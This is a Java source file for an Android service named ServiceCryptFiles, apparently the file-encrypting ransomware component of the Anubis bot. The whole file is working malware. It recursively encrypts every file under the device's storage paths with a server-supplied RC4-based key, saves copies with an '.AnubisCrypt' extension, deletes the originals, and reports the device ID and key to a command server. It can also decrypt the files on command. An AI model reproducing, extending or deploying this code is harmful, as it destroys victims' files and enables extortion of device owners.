package anubis.bot.myapplication;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import android.util.Base64;

import java.io.File;
import java.io.FileOutputStream;

import anubis.bot.myapplication.API.ClassRC4;


public class ServiceCryptFiles extends IntentService {
    UtilsClass utilsClass = new UtilsClass();
    String status="";
    String key="";
    public ServiceCryptFiles() {
        super("ServiceCryptFiles");
    }

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    @Override
    protected void onHandleIntent(Intent intent) {

            status = utilsClass.SetRead(this,"status");
            key = utilsClass.SetRead(this,"key");
            File mnt = new File("/mnt");
            File mount = new File("/mount");
            File sdcard = new File("/sdcard");
            File storage = new File("/storage");
        //    File Removable = new File("/Removable");
            try {
                utilsClass.Log("Cryptolocker", "1");
                getDir(Environment.getExternalStorageDirectory());
                utilsClass.Log("Cryptolocker", "2");
            }catch (Exception ex){}
            try {
                getDir(mnt);
                utilsClass.Log("Cryptolocker", "3");
            }catch (Exception ex){}

            try {
                getDir(mount);
                utilsClass.Log("Cryptolocker", "4");
            }catch (Exception ex){}

            try {
                getDir(sdcard);
                utilsClass.Log("Cryptolocker", "5");
            }catch (Exception ex){}

            try {
                getDir(storage);
                utilsClass.Log("Cryptolocker", "6");
            }catch (Exception ex){}

/*            try {
                getDir(Removable);
                utilsClass.Log("Cryptolocker", "END");
            }catch (Exception ex){}*/

            if(status.equals("crypt")) {
                utilsClass.POST(this, "4", "p=" + utilsClass.trafEnCr(utilsClass.ID_B(this) + "|The Cryptor is activated, the file system is encrypted by key: " + key + "|"));
                utilsClass.SetWrite(this,"cryptfile","true");
            }else if(status.equals("decrypt")){
                utilsClass.POST(this, "4", "p=" + utilsClass.trafEnCr(utilsClass.ID_B(this) + "|File System is Decrypted!|"));
                utilsClass.SetWrite(this,"cryptfile","false");
            }
            utilsClass.SetWrite(this,"status","");
            utilsClass.SetWrite(this,"key","");

    }
    //************************************
    void getDir(File rootFolder){
        try{
          //  System.out.println(rootFolder);
            File[] filesArray = rootFolder.listFiles();
            for (File f: filesArray){
                if (f.isDirectory()){
                    openDir(f);
                }
                else if (f.isFile()){
                    try{
                        byte[] file = utilsClass.loadFile(f);
                        if(status.equals("crypt")) {
                            if(!f.getPath().contains(".AnubisCrypt")){
                                file = utilsClass.cryptFile(file, key);
                                FileOutputStream os = new FileOutputStream(f.getPath() + ".AnubisCrypt", true);
                                os.write(file);
                                os.close();
                                f.delete();
                            }
                        }else if(status.equals("decrypt")){
                            if(f.getPath().contains(".AnubisCrypt")) {
                                file = utilsClass.decryptFile(file, key);
                                FileOutputStream os = new FileOutputStream(f.getPath().replace(".AnubisCrypt", ""), true);
                                os.write(file);
                                os.close();
                                f.delete();
                            }
                        }
                    }catch (Exception ee){}
                }
            }
        }catch (Exception ex){}
    }
    void openDir(File Dir) {
        try {
            File rootFolder = Dir;
            File[] filesArray = rootFolder.listFiles();
            for (File f : filesArray) {
                if (f.isDirectory()) {
                    openDir(f);
                } else if (f.isFile()) {
                    try {
                        byte[] file = utilsClass.loadFile(f);
                        if (status.equals("crypt")) {
                            if (!f.getPath().contains(".AnubisCrypt")) {
                                file = utilsClass.cryptFile(file, key);
                                FileOutputStream os = new FileOutputStream(f.getPath() + ".AnubisCrypt", true);
                                os.write(file);
                                os.close();
                                f.delete();
                            }
                        } else if (status.equals("decrypt")) {
                            if (f.getPath().contains(".AnubisCrypt")) {
                                file = utilsClass.decryptFile(file, key);
                                FileOutputStream os = new FileOutputStream(f.getPath().replace(".AnubisCrypt", ""), true);
                                os.write(file);
                                os.close();
                                f.delete();
                            }
                        }
                    } catch (Exception ee) {
                    }
                }
            }
        }catch (Exception ex){}
    }
}
